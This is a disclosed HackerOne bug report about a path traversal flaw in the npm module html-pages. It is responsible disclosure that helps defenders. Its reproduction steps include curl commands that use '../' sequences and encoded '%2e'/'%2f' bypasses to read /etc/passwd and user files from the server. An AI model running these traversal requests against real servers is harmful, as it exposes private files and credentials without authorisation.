# [html-pages] Path Traversal in html-pages module allows to read any file from the server with curl

## Report Details
- **Report ID**: 306607
- **URL**: https://hackerone.com/reports/306607
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-01-19T00:52:41.776Z
- **Disclosed**: 2018-05-19T12:55:48.532Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi,

This report is about Directory Traversal vulnerability I found in ```html-pages``` module.


**Module:** 

html-pages is a module which allows to browse directories and  serve static files in the browser. The vulnerability exists in the latest available version (2.0.7)

Link to npm page: https://www.npmjs.com/package/html-pages

**Summary:** 

When html-pages server is run, browser does not allow toread files from arbitrary locations. However, I've noticed that using simple bypasses with ```%2e``` (.) or ```%2f``` (/) I can easily go up in the directory tree. 
But it's not possible to open any file in the browser, due to characters used in the path, only directory listing is available:

{F255390}


However, with simple ```curl``` call we can read any file on the remote server where ```html-pages``` runs:

```
$ curl -v --path-as-is http://localhost:8000/../../../../../Users/bl4de/.vimrc
```

{F255392}

Here is the part of the code, which read directory content, but does not validate against Directory Traversal in any way, which literally makes ```root``` config setting useless:

https://github.com/danielcardoso/html-pages/blob/master/lib/server.js#L122


This vulnerability can be exploited regardless of some ```html-pages``` configuration settings, like ```root```. All files on the server can be read by malicious user.


## Steps To Reproduce:

- install ```html-pages```

```
$ npm install html-pages
```

- create simple application which uses ```html-pages``` for serving static files from local server:

```javascript
const pages = require('html-pages')

const pagesServer = pages(__dirname, {
    port: 8000,
    'directory-index': '',
    'root': './',
    'no-clipboard': true,
    ignore: ['.git', 'node_modules']
})
```

- run application:

```
$ node app.js
```

- open the browser and go to ```127.0.0.1:8000``` You should see all directories and files in the directory, where ```app.js``` was run. Now, try to modify url into something like ```127.0.0.1:8000/.%2e/.%2e/``` - now content of directory two levels up in the file tree should be displayed. Try to open any directory or file (if available) by clicking on its name.

You should notice that application actually hangs on. 

- from the terminal, execute following command (please adjust numbers of ../ to your system):

```
$ curl -v --path-as-is http://127.0.0.1:8000/../../../../../etc/passwd
```

You should see the content of ```/etc/passwd``` file:

{F255391}

## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.2
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

## Impact:

This vulnerability allows malisious user to read content of any file on machine where similar to presented app is running. This might expose vectors to attack system with Remote Code Execution, reveals files with usernames and passwords and many other possibilites.

## Attachments
- 1.png
- 3.png
- 2.png
